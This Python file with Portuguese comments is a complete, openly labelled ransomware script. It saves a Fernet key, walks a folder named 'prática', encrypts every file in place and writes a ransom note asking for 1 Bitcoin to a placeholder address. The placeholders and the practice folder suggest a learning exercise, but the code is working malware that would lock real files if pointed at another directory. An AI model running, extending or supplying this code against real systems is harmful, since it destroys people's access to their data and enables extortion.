from cryptography.fernet import Fernet
import os

#1 Gerar uma chave de criptografia e salvar

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_arquivo:
        chave_arquivo.write(chave)

#2 Carregar a chave de criptografia
def carregar_chave():
    return open("chave.key", "rb").read()

#3 função para verificar a chave
def verificar_chave(chave):
    try:
        f = Fernet(chave)
        return True
    except Exception:
        return False

#4 Função para criptografar arquivo
def criptografar_arquivo(caminho_arquivo, chave):
    f = Fernet(chave)
    with open(caminho_arquivo, "rb") as arquivo:
        dados = arquivo.read()
    dados_criptografados = f.encrypt(dados)
    with open(caminho_arquivo, "wb") as arquivo:
        arquivo.write(dados_criptografados)

#5 encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith("chave.key"):
                lista.append(caminho)
    return lista

#6 mensagem de resgate
def mensagem_resgate():
    with open("MENSAGEM_DE_RESGATE.txt", "w") as mensagem:
        mensagem.write("Seus arquivos foram criptografados\n")
        mensagem.write("Para recuperar seus arquivos, envie 1 Bitcoin para o endereço XYZ\n")
        mensagem.write("Depois de enviar o pagamento, entre em contato com nós em email@example.com\n")

#7 Execução do ransomware
def executar_ransomware():
    gerar_chave()
    chave = carregar_chave()
    arquivos_para_criptografar = encontrar_arquivos("prática")
    for arquivo in arquivos_para_criptografar:
        criptografar_arquivo(arquivo, chave)
    mensagem_resgate()

if __name__ == "__main__":
    executar_ransomware()